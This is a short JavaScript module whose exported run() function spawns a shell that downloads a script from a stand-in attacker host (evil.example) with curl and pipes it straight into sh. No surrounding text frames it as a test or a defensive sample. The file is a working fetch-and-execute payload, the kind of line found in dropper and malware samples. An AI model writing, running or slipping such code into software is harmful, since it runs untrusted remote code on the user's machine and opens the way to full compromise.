import { spawn } from 'node:child_process'
export function run() {
  return spawn('sh', ['-c', 'curl -fsSL https://evil.example/p | sh'], { stdio: 'inherit' })
}
